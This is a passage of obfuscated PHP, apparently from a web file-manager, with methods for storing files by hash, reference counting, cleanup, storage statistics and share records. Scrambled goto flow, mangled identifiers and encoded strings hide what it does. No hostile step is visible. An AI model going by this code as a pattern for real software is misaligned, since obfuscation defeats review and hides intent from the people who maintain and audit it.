$b¡£”ÄÇº¶[2066]: goto BÕá’÷¯¨ê; BÕá’÷¯¨ê: $f›‚°®èª¥ = Model($b¡£”ÄÇº¶[1067])->get($b¡£”ÄÇº¶[2067]); $e†––ªê™Š = substr(md5($b¡£”ÄÇº¶[1824] . $f›‚°®èª¥ . date($b¡£”ÄÇº¶[684])), 0, 8); $a¦½‚êø…Å = KodIO::defaultIO() . date($b¡£”ÄÇº¶[2068]) . $e†––ªê™Š . $b¡£”ÄÇº¶[8]; goto BåÛ³•ƒÍ; c×Á‡·Å¸: break; goto cÜÚòä‡ë; BåÛ³•ƒÍ: if ($b„¯Ü‹Æ†•->ext($dáèÜˆá£) == $b¡£”ÄÇº¶[2003]) { $dáèÜˆá£ .= $b¡£”ÄÇº¶[2065]; } $fîëºù¯˜È = IO::fileNameAuto($a¦½‚êø…Å, $dáèÜˆá£); $aá‰ñøØÖ = $a¦½‚êø…Å . $fîëºù¯˜È; goto c×Á‡·Å¸; cÜÚòä‡ë: case $b¡£”ÄÇº¶[2063]: break; default: break; } return $aá‰ñøØÖ; goto Dô†ÙõÆÍì; cÀ•“›´êÒ: $aá‰ñøØÖ = $a¦½‚êø…Å . rand_string(5) . short_id(100); $dáèÜˆá£ = str_replace($b¡£”ÄÇº¶[8], $b¡£”ÄÇº¶[71], KodIO::clear($dáèÜˆá£)); if (!$dáèÜˆá£) { $f÷ÚÎ¡Á® = $b¡£”ÄÇº¶[2063]; } goto Bëâª”‰Ğ; Dô†ÙõÆÍì: } public function addFileByRemote($dÙáˆ„¡ Ä, $AÎ‰Å©Ü³ç, $Dçç…·Ì¯“ = array()) { goto fôÚ¸ç‡Ù½; BÁ Ë—ª†–: $EŒÙƒ­­íˆ = IO::hashMd5($dÙáˆ„¡ Ä, $F¨ÅçÖç‚Û); $b†¦«Ê³ÕÃ = KodIO::defaultDriver(); $FÅ¿ØåÎõˆ = array($C¨¤„öˆ®[513] => IO::size($dÙáˆ„¡ Ä), $C¨¤„öˆ®[2069] => 1, $C¨¤„öˆ®[383] => $AÎ‰Å©Ü³ç, $C¨¤„öˆ®[743] => $b†¦«Ê³ÕÃ[$C¨¤„öˆ®[364]], $C¨¤„öˆ®[384] => $dÙáˆ„¡ Ä, $C¨¤„öˆ®[2070] => $Dçç…·Ì¯“[$C¨¤„öˆ®[161]] ? $Dçç…·Ì¯“[$C¨¤„öˆ®[161]] : IO::hashSimple($dÙáˆ„¡ Ä), $C¨¤„öˆ®[2071] => $EŒÙƒ­­íˆ ? $EŒÙƒ­­íˆ : $F¨ÅçÖç‚Û); goto FÑğ½ÑˆôÑ; FÑğ½ÑˆôÑ: if ($Bäğšäó¡ö = $this->addFileCheckExist($FÅ¿ØåÎõˆ[$C¨¤„öˆ®[161]], $FÅ¿ØåÎõˆ[$C¨¤„öˆ®[160]], $FÅ¿ØåÎõˆ[$C¨¤„öˆ®[78]])) { return $Bäğšäó¡ö; } return $this->addFileData($FÅ¿ØåÎõˆ); goto CôõÖ„Ú‘ ; fôÚ¸ç‡Ù½: $C¨¤„öˆ® =& $_SERVER[¿õñ]; if (!IO::exist($dÙáˆ„¡ Ä)) { return !1; } $F¨ÅçÖç‚Û = $Dçç…·Ì¯“[$C¨¤„öˆ®[160]] ? $Dçç…·Ì¯“[$C¨¤„öˆ®[160]] : $C¨¤„öˆ®[33]; goto BÁ Ë—ª†–; CôõÖ„Ú‘ : } private function addFileData($DÎò™¼œ‘í) { $aËİ÷á†× =& $_SERVER[¿õñ]; if (!$DÎò™¼œ‘í) { return !1; } $DÎò™¼œ‘í[$aËİ÷á†×[78]] = intval($DÎò™¼œ‘í[$aËİ÷á†×[78]]); if (!$DÎò™¼œ‘í[$aËİ÷á†×[78]] && strlen($DÎò™¼œ‘í[$aËİ÷á†×[161]]) > 32) { $DÎò™¼œ‘í[$aËİ÷á†×[78]] = intval(substr($DÎò™¼œ‘í[$aËİ÷á†×[161]], 32)); } $cÑ¬é…·‰È = $this->add($DÎò™¼œ‘í); return $this->find($cÑ¬é…·‰È); } public function addFile($D›»¶‚, $dÃƒ°¿·ˆ, $fÕ­°æÛ„˜ = false) { $aÆŒ‰‚£ÀÈ = IO::hashSimple($D›»¶‚); $c ÃòÂåÑİ = IO::hashMd5($D›»¶‚); $b¢Œ¨‘Ó½Œ = IO::size($D›»¶‚); if ($BÊì«Œ²è® = $this->addFileCheckExist($aÆŒ‰‚£ÀÈ, $c ÃòÂåÑİ, $b¢Œ¨‘Ó½Œ)) { return $BÊì«Œ²è®; } $BÓÖ¨„Îö¤ = $this->addFileMake($D›»¶‚, $b¢Œ¨‘Ó½Œ, $aÆŒ‰‚£ÀÈ, $c ÃòÂåÑİ, $dÃƒ°¿·ˆ, $fÕ­°æÛ„˜); return $this->addFileData($BÓÖ¨„Îö¤); } public function addFileMake($B‹”Ãİì, $fƒïÏ°šŒÃ, $aßƒ¤–¿à³, $aÏ½Ê‰èáä, $A—«†ó§‡», $fğßÇ¹ÅÂ) { goto b‹ì‘¼Ì¶½; D¬Í§Ö‚áÜ: $b áÍ©ˆŠø = get_path_this($aòß”‡Ô•ù); if ($fğßÇ¹ÅÂ) { $A‰˜¯‡’Ÿ = IO::move($B‹”Ãİì, $CÀÎâ™ù, !1, $b áÍ©ˆŠø); } else { $A‰˜¯‡’Ÿ = IO::copy($B‹”Ãİì, $CÀÎâ™ù, !1, $b áÍ©ˆŠø); } if (!$A‰˜¯‡’Ÿ) { return !1; } goto fê“Š®ï†; fê“Š®ï†: $FéöÊËˆá = KodIO::defaultDriver(); $d‹¦ƒÔ…¼ = array($e«î™ÇõÕ¥[513] => $fƒïÏ°šŒÃ, $e«î™ÇõÕ¥[2069] => 1, $e«î™ÇõÕ¥[383] => $A—«†ó§‡», $e«î™ÇõÕ¥[743] => $FéöÊËˆá[$e«î™ÇõÕ¥[364]], $e«î™ÇõÕ¥[384] => $aòß”‡Ô•ù, $e«î™ÇõÕ¥[2070] => $aßƒ¤–¿à³, $e«î™ÇõÕ¥[2071] => $aÏ½Ê‰èáä); return $d‹¦ƒÔ…¼; goto e¨ˆïî¦‘²; b‹ì‘¼Ì¶½: $e«î™ÇõÕ¥ =& $_SERVER[¿õñ]; $aòß”‡Ô•ù = $this->createFileName($A—«†ó§‡»); $CÀÎâ™ù = get_path_father($aòß”‡Ô•ù); goto D¬Í§Ö‚áÜ; e¨ˆïî¦‘²: } public function addFileCheckExist($BÎÂ“ÊÌ, $F…“ì˜‘ã¨, $d…ãƒàÙ¼İ) { $f×á‚¼Üë =& $_SERVER[¿õñ]; $b‰­ËĞ¾â­ = $this->findByHash($BÎÂ“ÊÌ, $F…“ì˜‘ã¨); if (!$b‰­ËĞ¾â­) { return !1; } $EÄò©¾¢ï = array($f×á‚¼Üë[2069] => intval($b‰­ËĞ¾â­[$f×á‚¼Üë[2072]]) + 1, $f×á‚¼Üë[513] => $d…ãƒàÙ¼İ); $this->where(array($f×á‚¼Üë[416] => $b‰­ËĞ¾â­[$f×á‚¼Üë[415]]))->save($EÄò©¾¢ï); return $b‰­ËĞ¾â­; } public function remove($Bˆ’àƒ„ÅÀ) { $this->linkCountChange($Bˆ’àƒ„ÅÀ, !1); $this->clearEmpty(); return !0; } public function linkAdd($E–ºø°ô©ß) { $this->linkCountChange($E–ºø°ô©ß, !0); } public function linkCountChange($d‹“ÇæÃ™Ã, $A‹‹„ÀŸŠ”) { goto EØ†õï÷–ö; EØ†õï÷–ö: $C¹¤©ŸÆà =& $_SERVER[¿õñ]; if (!$d‹“ÇæÃ™Ã) { return; } if (!is_array($d‹“ÇæÃ™Ã)) { $d‹“ÇæÃ™Ã = array($d‹“ÇæÃ™Ã); } goto A†¶´•¤æ; A†¶´•¤æ: $A¤—‹¶Š Æ = array(); foreach ($d‹“ÇæÃ™Ã as $Bñçà— –è) { $AöÁ¾†˜– = $Bñçà— –è . $C¹¤©ŸÆà[33]; if (!$A¤—‹¶Š Æ[$AöÁ¾†˜–]) { $A¤—‹¶Š Æ[$AöÁ¾†˜–] = 0; } $A¤—‹¶Š Æ[$AöÁ¾†˜–]++; } $Eª÷ŸíĞ = array(); goto B°Èï°¿Í‹; B°Èï°¿Í‹: foreach ($A¤—‹¶Š Æ as $Bñçà— –è => $eĞ·ß÷¶Ö) { $AöÁ¾†˜– = $eĞ·ß÷¶Ö . $C¹¤©ŸÆà[33]; if (!$Eª÷ŸíĞ[$AöÁ¾†˜–]) { $Eª÷ŸíĞ[$AöÁ¾†˜–] = array(); } $Eª÷ŸíĞ[$AöÁ¾†˜–][] = $Bñçà— –è; } foreach ($Eª÷ŸíĞ as $eĞ·ß÷¶Ö => $a‹ğ‚ÒÖ«à) { if (!$a‹ğ‚ÒÖ«à) { continue; } $eĞ·ß÷¶Ö = $A‹‹„ÀŸŠ” ? $eĞ·ß÷¶Ö : -intval($eĞ·ß÷¶Ö); $a—Ç«ï—õ‡ = array($C¹¤©ŸÆà[415] => array($C¹¤©ŸÆà[7], $a‹ğ‚ÒÖ«à)); if ($eĞ·ß÷¶Ö < 0) { $a—Ç«ï—õ‡[$C¹¤©ŸÆà[2072]] = array($C¹¤©ŸÆà[936], abs($eĞ·ß÷¶Ö)); } $this->where($a—Ç«ï—õ‡)->setAdd($C¹¤©ŸÆà[2072], $eĞ·ß÷¶Ö); } goto CÏŸ£´’; CÏŸ£´’: } public function findByHash($a¢øâØ‰ïã, $f”ŠÒ’Ö½‚ = false) { $Aà„´Ã ä• =& $_SERVER[¿õñ]; if (!$a¢øâØ‰ïã && !$f”ŠÒ’Ö½‚) { return !1; } $aãªÅéºŒ› = array($Aà„´Ã ä•[2070] => $a¢øâØ‰ïã); if ($f”ŠÒ’Ö½‚) { $aãªÅéºŒ› = array($Aà„´Ã ä•[2071] => $f”ŠÒ’Ö½‚); } return $this->order($Aà„´Ã ä•[2073])->where($aãªÅéºŒ›)->find(); } public function clearEmpty($B¥¦µÍæ›ø = 0) { goto aŠËİ‹æ˜¿; a‚¹¬‚ ‚Á: foreach ($b’‡¯íÉÅ as $DÜõ³‘Õøˆ) { $b¦œÌöÂ×ò->update(1); $this->resetFile($DÜõ³‘Õøˆ); } $b¦œÌöÂ×ò->end(); goto fØË„¯à‚Ö; aŠËİ‹æ˜¿: $få§’µÏÌò =& $_SERVER[¿õñ]; $cÆ‚¯ñÜó× = time() - 3600 * 24 * $B¥¦µÍæ›ø; $Eã±ëĞå¯ = $få§’µÏÌò[2074] . $cÆ‚¯ñÜó×; goto d¾ô¿¿ó‘; d¾ô¿¿ó‘: $b’‡¯íÉÅ = $this->where($Eã±ëĞå¯)->select(); if (!$b’‡¯íÉÅ) { return; } $b¦œÌöÂ×ò = new Task($få§’µÏÌò[2075], $få§’µÏÌò[33], count($b’‡¯íÉÅ)); goto a‚¹¬‚ ‚Á; fØË„¯à‚Ö: } private function resetFile($eáŸÅïš‹Ú) { goto aƒËŠÖêï; BåïÔÌ²§¸: if ($eáŸÅïš‹Ú[$aÀ‘°šÍ‡[2072]] != $AÌéêŸİ×„) { $this->where($FØ±­¼’×Ë)->save(array($aÀ‘°šÍ‡[2069] => $AÌéêŸİ×„)); } goto e‰Åæ¬‚šß; E–¶ÜÏ£»ó: $E¸íÒ¶¤˜¶ = Model($aÀ‘°šÍ‡[2076])->where($FØ±­¼’×Ë)->count(); $AÌéêŸİ×„ = intval($D‡ÒÙóŸŞ£) + intval($E¸íÒ¶¤˜¶); if ($AÌéêŸİ×„ == 0) { IO::remove($eáŸÅïš‹Ú[$aÀ‘°šÍ‡[76]]); $this->where($FØ±­¼’×Ë)->delete(); $this->metaSet($eáŸÅïš‹Ú[$aÀ‘°šÍ‡[415]], null, null); return; } goto BåïÔÌ²§¸; aƒËŠÖêï: $aÀ‘°šÍ‡ =& $_SERVER[¿õñ]; $FØ±­¼’×Ë = array($aÀ‘°šÍ‡[416] => $eáŸÅïš‹Ú[$aÀ‘°šÍ‡[415]]); $D‡ÒÙóŸŞ£ = Model($aÀ‘°šÍ‡[1087])->where($FØ±­¼’×Ë)->count(); goto E–¶ÜÏ£»ó; e‰Åæ¬‚šß: } public function storageInfo($FÇ°‘ƒŠÊà = false) { goto dÑ¡Ùìº‚Æ; C½º¿—›¶ğ: for ($A¼Ôä„°³ = 0; $A¼Ôä„°³ < $B­Ò°Ò©¨; $A¼Ôä„°³ = $A¼Ôä„°³ + $D¤„ïÌµ‘Û) { $dÍæÛÃ¹ñ¨ = $this->limit($A¼Ôä„°³, $A¼Ôä„°³ + $D¤„ïÌµ‘Û)->select(); foreach ($dÍæÛÃ¹ñ¨ as $BŒõààÚØ) { $B‰¯ï’‡ += $BŒõààÚØ[$dº¹„İÀ[78]] * $BŒõààÚØ[$dº¹„İÀ[2072]]; $D¡Ã†Åßİ += $BŒõààÚØ[$dº¹„İÀ[78]] * ($BŒõààÚØ[$dº¹„İÀ[2072]] - 1); $E³ï»ÙŒ‚é += $BŒõààÚØ[$dº¹„İÀ[2072]]; } } $Ašæ­Çô¨ = array($dº¹„İÀ[2077] => $B‰¯ï’‡, $dº¹„İÀ[2078] => $D¡Ã†Åßİ, $dº¹„İÀ[2079] => $D¡Ã†Åßİ / $B‰¯ï’‡, $dº¹„İÀ[82] => $B­Ò°Ò©¨, $dº¹„İÀ[2080] => $E³ï»ÙŒ‚é); return $Ašæ­Çô¨; goto dƒ•ËŒ×; dÑ¡Ùìº‚Æ: $dº¹„İÀ =& $_SERVER[¿õñ]; $B­Ò°Ò©¨ = $this->count() + 0.0; $D¡Ã†Åßİ = 0; goto bÑ°ÚÎ¦ãË; bÑ°ÚÎ¦ãË: $B‰¯ï’‡ = 1; $E³ï»ÙŒ‚é = 0; $D¤„ïÌµ‘Û = 5000; goto C½º¿—›¶ğ; dƒ•ËŒ×: } } goto F”±é£«£; c“öá„´å¦: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\145"; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\x54\151\155\145", "\164\151\155\x65", "\151\x6e\163\145\x72\x74\x2c\x75\x70\x64\141\164\x65", "\146\165\156\143\164\x69\157\x6e"), array("\x63\x72\x65\141\164\145\124\x69\155\145", "\x74\151\155\145", "\x69\156\x73\145\x72\x74", "\146\165\156\143\164\151\157\156"), array("\157\160\164\x69\x6f\156\163", '', "\x69\x6e\163\145\162\164\54\x75\160\144\x61\x74\145\x2c\163\145\x6c\145\x63\164", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($e•µ×Ôà“Ò) { $e¬„ˆ¥ÕäÁ =& $_SERVER[¿õñ]; $DŒ®®–¿¾¼ = isset($e•µ×Ôà“Ò[0]) ? $e•µ×Ôà“Ò[0] : !1; return array($e¬„ˆ¥ÕäÁ[2121] => array(USER_ID, $e¬„ˆ¥ÕäÁ[2122]), $e¬„ˆ¥ÕäÁ[2083] => array($DŒ®®–¿¾¼, $e¬„ˆ¥ÕäÁ[2123])); } protected function listSimple() { $Dƒˆî”Ì¹™ = array($_SERVER[¿õñ][1350] => USER_ID); $c§Á¡¥ˆ¾Ö = $this->field($this->fieldList)->where($Dƒˆî”Ì¹™)->select(); return $c§Á¡¥ˆ¾Ö ? $c§Á¡¥ˆ¾Ö : array(); } protected function getInfo($aé°ÑĞÌô, $FÜ¾ÖÕÀ‹ = false) { $AŸ²¬”“É· =& $_SERVER[¿õñ]; if ($FÜ¾ÖÕÀ‹) { return $this->_getShareInfo(array($AŸ²¬”“É·[437] => $aé°ÑĞÌô)); } $E¾Û¨·‰µö = $this->cacheFunctionGet($AŸ²¬”“É·[2124], $aé°ÑĞÌô); return $E¾Û¨·‰µö; } public function getInfoByHash($B˜¬ê®…Ã) { return $this->_getShareInfo(array($_SERVER[¿õñ][439] => $B˜¬ê®…Ã)); } public function getInfoByPath($F²Ü±İÏ»à) { $B«¿¦ƒ´ê =& $_SERVER[¿õñ]; $e‡°ø«ÈÓ = array($B«¿¦ƒ´ê[1350] => USER_ID, $B«¿¦ƒ´ê[366] => $F²Ü±İÏ»à); return $this->_getShareInfo($e‡°ø«ÈÓ); } public function getInfoBySourcePath($Fåæê¹ëÙµ) { $F¢‰ ÏƒÒ =& $_SERVER[¿õñ]; $Bîî¿­ïÌ = array($F¢‰ ÏƒÒ[1350] => USER_ID, $F¢‰ ÏƒÒ[1002] => $Fåæê¹ëÙµ); return $this->_getShareInfo($Bîî¿­ïÌ); } private function _getShareInfo($cÀâ÷½¬Û) { goto Bàµ¤†çÈÛ; B’ù¶ÓÎØ: $cÀâ÷½¬Û = array($c¡‡ÓÂ™Š‘[437] => $AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[437]]); $c×„ä®äÏ‚ = $c¡‡ÓÂ™Š‘[2125]; $ašãàë‚æ = Model($c¡‡ÓÂ™Š‘[529])->order($c¡‡ÓÂ™Š‘[364])->field($c×„ä®äÏ‚)->where($cÀâ÷½¬Û)->select(); goto c‡ªƒâŠ½ê; Bàµ¤†çÈÛ: $c¡‡ÓÂ™Š‘ =& $_SERVER[¿õñ]; $AâÑÍ¬š×İ = $this->where($cÀâ÷½¬Û)->find(); if (!$AâÑÍ¬š×İ) { return !1; } goto B’ù¶ÓÎØ; c‡ªƒâŠ½ê: if ($AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[366]] == $c¡‡ÓÂ™Š‘[464]) { $AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[388]] = IO::info($AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[1002]]); } else { $AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[388]] = Model($c¡‡ÓÂ™Š‘[1087])->pathInfo($AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[366]]); } $AâÑÍ¬š×İ[$c¡‡ÓÂ™Š‘[2126]] = $ašãàë‚æ; return $AâÑÍ¬š×İ; goto d‹¡åŸô¨; d‹¡åŸô¨: } protected function getInfoAuth($C–Ä£²ë¡Ó) { $aœ…ÈŒÊ˜Ì =& $_SERVER[¿õñ]; $DÉ¬‘ÔÙËË = $this->getInfo($C–Ä£²ë¡Ó); $DÉ¬‘ÔÙËË[$aœ…ÈŒÊ˜Ì[373]] = Model($aœ…ÈŒÊ˜Ì[450])->authMake($DÉ¬‘ÔÙËË[$aœ…ÈŒÊ˜Ì[2126]]); return $DÉ¬‘ÔÙËË; } protected function listData($A‚ò×³çç  = null, $B³ †„Ùà’ = 300) { $FƒÀÕçˆĞ =& $_SERVER[¿õñ]; $A‚ô‘™·Şë = array(array($FƒÀÕçˆĞ[442] => array($FƒÀÕçˆĞ[933], 0), $FƒÀÕçˆĞ[444] => array($FƒÀÕçˆĞ[933], 0), $FƒÀÕçˆĞ[2127] => $FƒÀÕçˆĞ[2096])); if ($A‚ò×³çç  == $FƒÀÕçˆĞ[1778]) { $A‚ô‘™·Şë = array($FƒÀÕçˆĞ[442] => 1); } else { if ($A‚ò×³çç  == $FƒÀÕçˆĞ[991]) { $A‚ô‘™·Şë = array($FƒÀÕçˆĞ[444] => 1); } } $A‚ô‘™·Şë[$FƒÀÕçˆĞ[1350]] = USER_ID; $bîğùÀ¤®¢ = $this->where($A‚ô‘™·Şë)->selectPage($B³ †„Ùà’); return $bîğùÀ¤®¢; } protected function listToMe($Fæˆ”Ğ Œ¼ = 300) { goto C°Š”Õê; CƒÅªõ–¿£: $bËëĞëÆÍ‹ = array($dìÒô¢ï„•[514] => SourceModel::TYPE_USER, $dìÒô¢ï„•[452] => USER_ID); if ($F™˜…½¯Äã) { $bËëĞëÆÍ‹ = array(array($dìÒô¢ï„•[514] => SourceModel::TYPE_USER, $dìÒô¢ï„•[452] => USER_ID), array($dìÒô¢ï„•[514] => SourceModel::TYPE_GROUP, $dìÒô¢ï„•[452] => array($dìÒô¢ï„•[7], $F™˜…½¯Äã)), $dìÒô¢ï„•[2127] => $dìÒô¢ï„•[2096]); } $DÌ›Ë“°³Î = Model($dìÒô¢ï„•[529])->where($bËëĞëÆÍ‹)->selectPage($Fæˆ”Ğ Œ¼); goto dƒœŒ¨™Ìö; C°Š”Õê: $dìÒô¢ï„• =& $_SERVER[¿õñ]; $d¬ì´ÕÚôÙ = Session::get($dìÒô¢ï„•[2128]); $F™˜…½¯Äã = array_to_keyvalue($d¬ì´ÕÚôÙ, $dìÒô¢ï„•[33], $dìÒô¢ï„•[2013]); goto CƒÅªõ–¿£; b¡ŸÏÍò¸»: $A¾Ë‹’—Ï = array($dìÒô¢ï„•[2130] => $e¼°’Ì«œ, $dìÒô¢ï„•[2131] => $DÌ›Ë“°³Î[$dìÒô¢ï„•[347]]); return $A¾Ë‹’—Ï; goto EÕÁœ¯•´; dƒœŒ¨™Ìö: $A“ÒˆÍçñÍ = array_to_keyvalue_group($DÌ›Ë“°³Î[$dìÒô¢ï„•[350]], $dìÒô¢ï„•[437]); if (!$A“ÒˆÍçñÍ) { return $DÌ›Ë“°³Î; } $f‡¬…¼ª¼ó = $dìÒô¢ï„•[2129]; goto bàŠ¯èôìâ; bàŠ¯èôìâ: $bËëĞëÆÍ‹ = array($dìÒô¢ï„•[437] => array($dìÒô¢ï„•[381], array_keys($A“ÒˆÍçñÍ))); $e¼°’Ì«œ = $this->field($f‡¬…¼ª¼ó)->where($bËëĞëÆÍ‹)->select(); foreach ($e¼°’Ì«œ as $f‚·¤÷èÎ‡ => &$C©»îôî¸¤) { $C©»îôî¸¤[$dìÒô¢ï„•[2126]] = $A“ÒˆÍçñÍ[$C©»îôî¸¤[$dìÒô¢ï„•[437]]]; } goto b¡ŸÏÍò¸»; EÕÁœ¯•´: } protected function shareAdd($Dß¦ÖÂŠ…, $E¿ÛÏ§ïä) { $dİ°³¯¨¡ =& $_SERVER[¿õñ]; $B‡ÄóŸíƒ = $this->_addShareData($Dß¦ÖÂŠ…, $E¿ÛÏ§ïä); if (isset($E¿ÛÏ§ïä[$dİ°³¯¨¡[2132]]) && count($E¿ÛÏ§ïä[$dİ°³¯¨¡[2132]]) > 0) { $this->_shareAuthSet($B‡ÄóŸíƒ, $E¿ÛÏ§ïä[$dİ°³¯¨¡[2132]]); } $this->shareEventAdd($Dß¦ÖÂŠ…, $E¿ÛÏ§ïä, $dİ°³¯¨¡[994]); return $B‡ÄóŸíƒ; } private function shareEventAdd($F°ÁŞİ­Ù, $dÖâĞÍ•¼, $aêØ—¤Â¯É = "\x61\144\x64") { goto CˆÂë›¬íÌ; b†»…Ó‰•: if ($Cùí§Ë·Ø[$bæÌ¥åÙï[444]] == $bæÌ¥åÙï[464] && $dÖâĞÍ•¼[$bæÌ¥åÙï[444]] == $bæÌ¥åÙï[493]) { $d¡Ş¬öĞ‰· = $bæÌ¥åÙï[2134]; } if ($Cùí§Ë·Ø[$bæÌ¥åÙï[444]] == $bæÌ¥åÙï[493] && $dÖâĞÍ•¼[$bæÌ¥åÙï[444]] == $bæÌ¥åÙï[464]) { $d¡Ş¬öĞ‰· = $bæÌ¥åÙï[2137]; } Model($bæÌ¥åÙï[498])->eventShare($F°ÁŞİ­Ù, $d¡Ş¬öĞ‰·); goto E«²õÄÅì; e˜¯¦Ê¢ì¢: $d¡Ş¬öĞ‰· = $bæÌ¥åÙï[2135]; if ($Cùí§Ë·Ø[$bæÌ¥åÙï[442]] == $bæÌ¥åÙï[464] && $dÖâĞÍ•¼[$bæÌ¥åÙï[442]] == $bæÌ¥åÙï[493]) { $d¡Ş¬öĞ‰· = $bæÌ¥åÙï[2133]; } if ($Cùí§Ë·Ø[$bæÌ¥åÙï[442]] == $bæÌ¥åÙï[493] && $dÖâĞÍ•¼[$bæÌ¥åÙï[442]] == $bæÌ¥åÙï[464]) { $d¡Ş¬öĞ‰· = $bæÌ¥åÙï[2136]; } goto b†»…Ó‰•; E«²õÄÅì: return; goto Cš†ÒâÚË; CˆÂë›¬íÌ: $bæÌ¥åÙï =& $_SERVER[¿õñ]; if ($aêØ—¤Â¯É == $bæÌ¥åÙï[994]) { if ($dÖâĞÍ•¼[$bæÌ¥åÙï[442]] == $bæÌ¥åÙï[493]) { Model($bæÌ¥åÙï[498])->eventShare($F°ÁŞİ­Ù, $bæÌ¥åÙï[2133]); } if ($dÖâĞÍ•¼[$bæÌ¥åÙï[444]] == $bæÌ¥åÙï[493]) { Model($bæÌ¥åÙï[498])->eventShare($F°ÁŞİ­Ù, $bæÌ¥åÙï[2134]); } return; } $Cùí§Ë·Ø = $this->getInfoByPath($F°ÁŞİ­Ù); goto e˜¯¦Ê¢ì¢; Cš†ÒâÚË: } private function _addShareData($dÜ»İŒ¦˜, $dÂ‰²ÖØĞã = array()) { goto A×–·éñ¢“; Bä Åğêƒ: if ($dÈ¸¼‘ŸåŒ = $this->where($F“ï“ø¥Ñ)->find()) { return $dÈ¸¼‘ŸåŒ[$fØË½¶âù®[437]]; } if ($dÜ»İŒ¦˜ == 0) { $f„™¥ã¾À = array($fØË½¶âù®[28] => get_path_this($dÂ‰²ÖØĞã[$fØË½¶âù®[76]])); } else { $f„™¥ã¾À = Model($fØË½¶âù®[759])->sourceInfo($dÜ»İŒ¦˜); if (!$f„™¥ã¾À) { return !1; } } if (!$dÂ‰²ÖØĞã[$fØË½¶âù®[1247]]) { $dÂ‰²ÖØĞã[$fØË½¶âù®[1247]] = $f„™¥ã¾À[$fØË½¶âù®[28]]; } goto F®öÑ Òƒ; A×–·éñ¢“: $fØË½¶âù® =& $_SERVER[¿õñ]; $F“ï“ø¥Ñ = array($fØË½¶âù®[380] => $dÜ»İŒ¦˜, $fØË½¶âù®[1341] => USER_ID); if ($dÜ»İŒ¦˜ == 0) { $F“ï“ø¥Ñ = array($fØË½¶âù®[2138] => $dÂ‰²ÖØĞã[$fØË½¶âù®[1002]], $fØË½¶âù®[1341] => USER_ID); } goto Bä Åğêƒ; bÈ‰ØÙ«„ğ: $BŠˆÃªÌçç = $this->add($e ğ¼ø–); $D¸÷À¾ ì = array($fØË½¶âù®[439] => short_id($BŠˆÃªÌçç)); $this->where(array($fØË½¶âù®[436] => $BŠˆÃªÌçç))->save($D¸÷À¾ ì); goto dÁĞ‹¦Î; F®öÑ Òƒ: $e ğ¼ø– = array($fØË½¶âù®[1341] => USER_ID, $fØË½¶âù®[380] => $dÜ»İŒ¦˜, $fØË½¶âù®[1247] => $fØË½¶âù®[33], $fØË½¶âù®[442] => 0, $fØË½¶âù®[444] => 0, $fØË½¶âù®[1002] => $fØË½¶âù®[33], $fØË½¶âù®[292] => $fØË½¶âù®[33], $fØË½¶âù®[808] => $fØË½¶âù®[33], $fØË½¶âù®[2139] => 0, $fØË½¶âù®[2140] => 0, $fØË½¶âù®[700] => 0, $fØË½¶âù®[2141] => $fØË½¶âù®[33], $fØË½¶âù®[439] => $fØË½¶âù®[33]); $E‘çÛ¢òŸ‡ = explode($fØË½¶âù®[47], $fØË½¶âù®[2142]); foreach ($E‘çÛ¢òŸ‡ as $F†Öñ„ÊÄî) { if (!isset($dÂ‰²ÖØĞã[$F†Öñ„ÊÄî])) { continue; } $e ğ¼ø–[$F†Öñ„ÊÄî] = $dÂ‰²ÖØĞã[$F†Öñ„ÊÄî]; } goto bÈ‰ØÙ«„ğ; dÁĞ‹¦Î: return $BŠˆÃªÌçç; goto dŸŞñÉõ—; dŸŞñÉõ—: } private function _shareAuthSet($c‰öÏÆçÇ§, $B»œ›ÛÆ“è) { goto d´‹öí£ğø; e…£´ÒÇî: $B‘´­ØÉÎØ->where(array($BÇÒ«Àœà[437] => $c‰öÏÆçÇ§))->delete(); $C¿Ñ”öÆ‡ = array(); foreach ($B»œ›ÛÆ“è as $B¬Ìé´àèº) { $e¡ò×ª¿Ø™ = SourceModel::TYPE_USER; if ($B¬Ìé´àèº[$BÇÒ«Àœà[368]] == SourceModel::TYPE_GROUP) { $e¡ò×ª¿Ø™ = SourceModel::TYPE_GROUP; } $bÄ®½Ì–»ˆ = array($BÇÒ«Àœà[437] => $c‰öÏÆçÇ§, $BÇÒ«Àœà[368] => $e¡ò×ª¿Ø™, $BÇÒ«Àœà[452] => intval($B¬Ìé´àèº[$BÇÒ«Àœà[452]]), $BÇÒ«Àœà[2144] => 0, $BÇÒ«Àœà[2145] => -1); if ($B¬Ìé´àèº[$BÇÒ«Àœà[2144]]) { $bÄ®½Ì–»ˆ[$BÇÒ«Àœà[2144]] = $B¬Ìé´àèº[$BÇÒ«Àœà[2144]]; } else { if ($B¬Ìé´àèº[$BÇÒ«Àœà[2145]]) { $bÄ®½Ì–»ˆ[$BÇÒ«Àœà[2145]] = $B¬Ìé´àèº[$BÇÒ«Àœà[2145]]; } } $C¿Ñ”öÆ‡[] = $bÄ®½Ì–»ˆ; } goto CÇéìÌÃÀè; CÇéìÌÃÀè: return $B‘´­ØÉÎØ->addAll($C¿Ñ”öÆ‡, array(), !0); goto b²›á‡é„; d´‹öí£ğø: $BÇÒ«Àœà =& $_SERVER[¿õñ]; if (!is_array($B»œ›ÛÆ“è)) { return !1; } $B‘´­ØÉÎØ = Model($BÇÒ«Àœà[2143]); goto e…£´ÒÇî; b²›á‡é„: } public function numViewAdd($aö¯©±‘ò) { $e¥¢›™ëÉ =& $_SERVER[¿õñ]; $b¥ŞÁªÎ‰Â = array($e¥¢›™ëÉ[436] => $aö¯©±‘ò); $this->where($b¥ŞÁªÎ‰Â)->setAdd($e¥¢›™ëÉ[2139]); } public function numDownloadAdd($f·Ü™º‰¯Ğ) { $CßôÅ÷Ä•ä =& $_SERVER[¿õñ]; $b…ŞĞŒ³Œ« = array($CßôÅ÷Ä•ä[436] => $f·Ü™º‰¯Ğ); $this->where($b…ŞĞŒ³Œ«)->setAdd($CßôÅ÷Ä•ä[2140]); } protected function shareEdit($eäÌåÛĞ™, $B×ªÒ»‘ÆÆ) { goto EË¾¾ÍÛÈß; EË¾¾ÍÛÈß: 